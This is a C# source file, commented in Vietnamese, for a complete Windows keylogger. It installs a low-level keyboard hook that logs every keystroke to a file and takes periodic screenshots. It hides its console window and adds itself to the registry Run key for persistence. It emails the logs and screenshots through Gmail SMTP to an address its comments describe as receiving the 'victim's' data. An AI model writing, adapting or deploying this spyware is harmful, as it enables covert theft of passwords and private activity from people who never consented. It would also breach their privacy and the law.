using Microsoft.Win32;
using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.Drawing;
using System.Drawing.Imaging;
using System.IO;
using System.Linq;
using System.Net.Mail;
using System.Runtime.InteropServices;
using System.Text;
using System.Threading;
using System.Threading.Tasks;
using System.Windows.Forms;

namespace Windows_Application
{
    class Program
    {
        #region Nhận biết các phím đã nhấn xuống.
        private const int WH_KEYBOARD_LL = 13; // mã nhả phím lên
        private const int WM_KEYDOWN = 0x0100; // mã nhấn phím xuống

        private static LowLevelKeyboardProc _proc = HookCallback; // Tạo ra một hàm Hookcallback - Deligate
        private static IntPtr _hookID = IntPtr.Zero; //định danh từng keys - handle

        private static string logName = "Log_";
        private static string logExtendtion = ".txt";




        [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        private static extern IntPtr SetWindowsHookEx(int idHook,
            LowLevelKeyboardProc lpfn, IntPtr hMod, uint dwThreadId);

        [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        [return: MarshalAs(UnmanagedType.Bool)]
        private static extern bool UnhookWindowsHookEx(IntPtr hhk);

        [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        private static extern IntPtr CallNextHookEx(IntPtr hhk, int nCode,
            IntPtr wParam, IntPtr lParam);

        [DllImport("kernel32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        private static extern IntPtr GetModuleHandle(string lpModuleName);






        /// <summary>
        /// Delegate a LowLevelKeyboardProc to use user32.dll
        /// </summary>
        /// <param name="nCode"></param>
        /// <param name="wParam"></param>
        /// <param name="lParam"></param>
        /// <returns></returns>
        private delegate IntPtr LowLevelKeyboardProc(
        int nCode, IntPtr wParam, IntPtr lParam);

        /// <summary>
        /// Set hook into all current process
        /// </summary>
        /// <param name="proc"></param>
        /// <returns></returns>

        // Lấy tất cả các process đạng chạy trong Task Manager
        private static IntPtr SetHook(LowLevelKeyboardProc proc)
        {
            using (Process curProcess = Process.GetCurrentProcess())
            {
                using (ProcessModule curModule = curProcess.MainModule)
                {
                    return SetWindowsHookEx(WH_KEYBOARD_LL, proc,    // Lấy các handle 
                    GetModuleHandle(curModule.ModuleName), 0);       // Truyền vào các thông tin mình muốn
                }
            }
        }

        /// <summary>
        /// Every time the OS call back pressed key. Catch them 
        /// then cal the CallNextHookEx to wait for the next key
        /// </summary>
        /// <param name="nCode"></param>
        /// <param name="wParam"></param>
        /// <param name="lParam"></param>
        /// <returns></returns>
        private static IntPtr HookCallback(int nCode, IntPtr wParam, IntPtr lParam)
        {
            if (nCode >= 0 && wParam == (IntPtr)WM_KEYDOWN)  // Nếu có phím đc nhấn xuống code sẽ chạy
            {
                int vkCode = Marshal.ReadInt32(lParam);  // Xuất code của phím ng dùng nhấn

                CheckHotKey(vkCode);                     // Đọc key để mở cmd
                WriteLog(vkCode);                        // Ghi log ra
            }
            return CallNextHookEx(_hookID, nCode, wParam, lParam); // Thực hiện lại phương thức handle để nhận biết keys
        }

        /// <summary>
        /// Write pressed key into log.txt file
        /// </summary>
        /// <param name="vkCode"></param>
        static void WriteLog(int vkCode)
        {
            String key = "";

            Console.WriteLine((Keys)vkCode);
            string logNameToWrite = logName + DateTime.Now.ToLongDateString() + logExtendtion;
            StreamWriter sw = new StreamWriter(logNameToWrite, true);

            if (vkCode == 8) key = "[Back]";

            //Kí tự đặc biệt

            else if (vkCode == 48 || vkCode == 161) key = ")";
            else if (vkCode == 49 || vkCode == 161) key = "!";
            else if (vkCode == 50 || vkCode == 161) key = "@";
            else if (vkCode == 51 || vkCode == 161) key = "#";
            else if (vkCode == 52 || vkCode == 161) key = "$";
            else if (vkCode == 53 || vkCode == 161) key = "%";
            else if (vkCode == 54 || vkCode == 161) key = "^";
            else if (vkCode == 55 || vkCode == 161) key = "&";
            else if (vkCode == 56 || vkCode == 161) key = "*";



            else if (vkCode == 9) key = "\r"; //[Tab]
            else if (vkCode == 13) key = "\n"; //[Enter]
            else if (vkCode == 19) key = "[Pause]";
            else if (vkCode == 20) key = "[Caps Lock]";
            else if (vkCode == 27) key = "[Esc]";
            else if (vkCode == 32) key = " "; // [Space]
            else if (vkCode == 33) key = "[Page Up]";
            else if (vkCode == 34) key = "[Page Down]";
            else if (vkCode == 35) key = "[End]";
            else if (vkCode == 36) key = "[Home]";
            else if (vkCode == 37) key = "Left]";
            else if (vkCode == 38) key = "[Up]";
            else if (vkCode == 39) key = "[Right]";
            else if (vkCode == 40) key = "[Down]";
            else if (vkCode == 44) key = "[Print Screen]";
            else if (vkCode == 45) key = "\n"; // [Insert]
            else if (vkCode == 46) key = "[Delete]";
            else if (vkCode == 48) key = "0";
            else if (vkCode == 49) key = "1";
            else if (vkCode == 50) key = "2";
            else if (vkCode == 51) key = "3";
            else if (vkCode == 52) key = "4";
            else if (vkCode == 53) key = "5";
            else if (vkCode == 54) key = "6";
            else if (vkCode == 55) key = "7";
            else if (vkCode == 56) key = "8";
            else if (vkCode == 57) key = "9";
            else if (vkCode == 65) key = "a";
            else if (vkCode == 66) key = "b";
            else if (vkCode == 67) key = "c";
            else if (vkCode == 68) key = "d";
            else if (vkCode == 69) key = "e";
            else if (vkCode == 70) key = "f";
            else if (vkCode == 71) key = "g";
            else if (vkCode == 72) key = "h";
            else if (vkCode == 73) key = "i";
            else if (vkCode == 74) key = "j";
            else if (vkCode == 75) key = "k";
            else if (vkCode == 76) key = "l";
            else if (vkCode == 77) key = "m";
            else if (vkCode == 78) key = "n";
            else if (vkCode == 79) key = "o";
            else if (vkCode == 80) key = "p";
            else if (vkCode == 81) key = "q";
            else if (vkCode == 82) key = "r";
            else if (vkCode == 83) key = "s";
            else if (vkCode == 84) key = "t";
            else if (vkCode == 85) key = "u";
            else if (vkCode == 86) key = "v";
            else if (vkCode == 87) key = "w";
            else if (vkCode == 88) key = "x";
            else if (vkCode == 89) key = "y";
            else if (vkCode == 90) key = "z";
            else if (vkCode == 91) key = "[Windows]";
            else if (vkCode == 92) key = "[Windows]";
            else if (vkCode == 93) key = "[List]";
            else if (vkCode == 96) key = "0";
            else if (vkCode == 97) key = "1";
            else if (vkCode == 98) key = "2";
            else if (vkCode == 99) key = "3";
            else if (vkCode == 100) key = "4";
            else if (vkCode == 101) key = "5";
            else if (vkCode == 102) key = "6";
            else if (vkCode == 103) key = "7";
            else if (vkCode == 104) key = "8";
            else if (vkCode == 105) key = "9";
            else if (vkCode == 106) key = "*";
            else if (vkCode == 107) key = "+";
            else if (vkCode == 109) key = "-";
            else if (vkCode == 110) key = ",";
            else if (vkCode == 111) key = "/";
            else if (vkCode == 112) key = "[F1]";
            else if (vkCode == 113) key = "[F2]";
            else if (vkCode == 114) key = "[F3]";
            else if (vkCode == 115) key = "[F4]";
            else if (vkCode == 116) key = "[F5]";
            else if (vkCode == 117) key = "[F6]";
            else if (vkCode == 118) key = "[F7]";
            else if (vkCode == 119) key = "[F8]";
            else if (vkCode == 120) key = "[F9]";
            else if (vkCode == 121) key = "[F10]";
            else if (vkCode == 122) key = "[F11]";
            else if (vkCode == 123) key = "[F12]";
            else if (vkCode == 144) key = "[Num Lock]";
            else if (vkCode == 145) key = "[Scroll Lock]";
           /* else if (vkCode == 160) key = "[Left-Shift]";
            else if (vkCode == 161) key = "[Right-Shift]";*/
            else if (vkCode == 162) key = "[Ctrl]";
            else if (vkCode == 163) key = "[Ctrl]";
            else if (vkCode == 164) key = "[Alt]";
            else if (vkCode == 165) key = "[Alt]";
            else if (vkCode == 187) key = "=";
            else if (vkCode == 186) key = "ç";
            else if (vkCode == 188) key = ",";
            else if (vkCode == 189) key = "-";
            else if (vkCode == 190) key = ".";
            else if (vkCode == 192) key = "'";
            else if (vkCode == 191) key = ";";
            else if (vkCode == 193) key = "/";
            else if (vkCode == 194) key = ".";
            else if (vkCode == 219) key = "´";
            else if (vkCode == 220) key = "]";
            else if (vkCode == 221) key = "[";
            else if (vkCode == 222) key = "~";
            else if (vkCode == 226) key = "\\";


      

            else key = "[" + vkCode + "]";


            //sw.Write((Keys)vkCode);

            sw.Write(key);
            sw.Close();
        }

        /// <summary>
        /// Start hook key board and hide the key logger
        /// Key logger only show again if pressed right Hot key
        /// </summary>
        static void HookKeyboard()
        {
            _hookID = SetHook(_proc);     // Lấy được keys người dùng để sử dụng
            Application.Run();            // Chạy chương trình để chắc chắn đang chạy
            UnhookWindowsHookEx(_hookID); // Hủy key mới lấy
        }

        static bool isHotKey = false; // Phím tắt ...
        static bool isShowing = false; // Hiển thị cmd
        static Keys previoursKey = Keys.Separator; // 

        static void CheckHotKey(int vkCode)
        {
            if ((previoursKey == Keys.LControlKey || previoursKey == Keys.RControlKey) && (Keys)(vkCode) == Keys.L)
                isHotKey = true;
            // Phím tắt Ctrl + L để ẩn hiện cmd 
            if (isHotKey)
            {
                if (!isShowing)
                {
                    DisplayWindow();// Nếu chưa hiển thị, bấm phím tắt để hiển thị                   
                }
                else
                    HideWindow();

                isShowing = !isShowing;
            }

            previoursKey = (Keys)vkCode;
            isHotKey = false;
        }
        #endregion

        #region Chụp màn hình.
        static string imagePath = "Image_";
        static string imageExtendtion = ".png";

        static int imageCount = 0;
        static int captureTime = 100;

        /// <summary>
        /// Capture al screen then save into ImagePath
        /// </summary>
        static void CaptureScreen()
        {
            //Tạo bitmap.
            var bmpScreenshot = new Bitmap(Screen.PrimaryScreen.Bounds.Width,  // Lấy kích thước 
                                           Screen.PrimaryScreen.Bounds.Height, // của màn hình.
                                           PixelFormat.Format32bppArgb); 

            // Tạo các điểm ảnh có kích thước bằng màn hình.
            var gfxScreenshot = Graphics.FromImage(bmpScreenshot);

            // Lưu tất cả các điểm ảnh trên màn hình vào trong file.
            gfxScreenshot.CopyFromScreen(Screen.PrimaryScreen.Bounds.X,
                                        Screen.PrimaryScreen.Bounds.Y,
                                        0,
                                        0,
                                        Screen.PrimaryScreen.Bounds.Size,
                                        CopyPixelOperation.SourceCopy);

            string directoryImage = imagePath + DateTime.Now.ToLongDateString();

            if (!Directory.Exists(directoryImage)) // Nếu chưa tồn tại đường dẫn thì thực hiện điều kiện
            {
                Directory.CreateDirectory(directoryImage); // Tạo mới thư mục
            }
            // Lưu đường dẫn đã được chỉ định
            string imageName = string.Format("{0}\\{1}{2}", directoryImage, DateTime.Now.ToLongDateString() + imageCount, imageExtendtion);

            try
            {
                bmpScreenshot.Save(imageName, ImageFormat.Png); //Lưu lại hình ảnh đã chụp theo đường dẫn
            }
            catch
            {

            }
            imageCount++;
        }
        #endregion

        #region Thời Gian.
        static int interval = 1; 
        static void StartTimmer()
        {
            Thread thread = new Thread(() => {       // Sử dụng đa luồng
                while (true)
                {
                    Thread.Sleep(100);

                    if (interval % captureTime == 0) // Nếu vòng lặp 1000 lần - sẽ chạy code để chụp màn hình
                        CaptureScreen();

                    if (interval % mailTime == 0)// Nếu vòng lặp 100 lần - sẽ gửi mail
                        SendMail();

                    interval++;

                    if (interval >= 1000000) 
                        interval = 0;
                }
            });
            thread.IsBackground = true; // Nếu ứng dụng tắt sẽ tắt theo
            thread.Start();             // Khởi động thread cùng hệ thống
        }
        #endregion

        #region Windows
        [DllImport("kernel32.dll")]
        static extern IntPtr GetConsoleWindow();

        [DllImport("user32.dll")]
        static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);

        // hide window code
        const int SW_HIDE = 0;

        // show window code
        const int SW_SHOW = 5;

        static void HideWindow()
        {
            IntPtr console = GetConsoleWindow();
            ShowWindow(console, SW_HIDE);
        }

        static void DisplayWindow()
        {
            IntPtr console = GetConsoleWindow();
            ShowWindow(console, SW_SHOW);
        }
        #endregion        

        #region Gửi mail
        static int mailTime = 100;
        static void SendMail()
        {
            try
            {
                MailMessage mail = new MailMessage();
                SmtpClient SmtpServer = new SmtpClient("smtp.gmail.com"); // Client dùng để gửi mail 

                mail.From = new MailAddress("email@gmail.com");
                mail.To.Add("youremail@gmail.com"); //Mail mà thông tin của victim được gửi về 
                // Chỉnh sửa lại "email" để phù hợp 
                mail.Subject = "Keylogger date: " + DateTime.Now.ToLongDateString();
                mail.Body = "Nội dung của victim\n" + "\n";

                string logFile = logName + DateTime.Now.ToLongDateString() + logExtendtion;

                if (File.Exists(logFile)) //Những file đính kèm của victim 
                {
                    StreamReader sr = new StreamReader(logFile);

                    mail.Body += sr.ReadToEnd();

                    sr.Close();
                }

                string directoryImage = imagePath + DateTime.Now.ToLongDateString();
                DirectoryInfo image = new DirectoryInfo(directoryImage);

                foreach (FileInfo item in image.GetFiles("*.png"))
                {
                    if (File.Exists(directoryImage + "\\" + item.Name))
                        mail.Attachments.Add(new Attachment(directoryImage + "\\" + item.Name));
                }

                SmtpServer.Port = 587;
                SmtpServer.Credentials = new System.Net.NetworkCredential("youremail@gmail.com", "Password");// Tài khoản và mật khẩu của mình để gửi mail
                SmtpServer.EnableSsl = true;


                SmtpServer.Send(mail);
                Console.WriteLine("Send mail!");

                // phải làm cái này ở mail dùng để gửi phải bật lên
                // https://www.google.com/settings/u/1/security/lesssecureapps
            }
            catch (Exception ex)
            {
                Console.WriteLine(ex.ToString());
            }
        }
        #endregion

        #region Registry - quyền mở ứng dụng khi khởi động
        static void StartWithOS()
        {
            RegistryKey regkey = Registry.CurrentUser.CreateSubKey("Software\\HutechListener");
            RegistryKey regstart = Registry.CurrentUser.CreateSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run");
            string keyvalue = "1";
            try
            {
                regkey.SetValue("Index", keyvalue);
                regstart.SetValue("HutechListener", Application.StartupPath + "\\" + Application.ProductName + ".exe");
                regkey.Close();
            }
            catch (System.Exception ex)
            {
            }
        }
        #endregion



        static void Main(string[] args)
        {

            StartWithOS(); //Chạy khi khởi động
            HideWindow(); //Ẩn terminal

            StartTimmer(); //Thời gian chụp ảnh, gửi mail,...
            HookKeyboard();// Nhận diện phím được bấm
        }
    }
}
    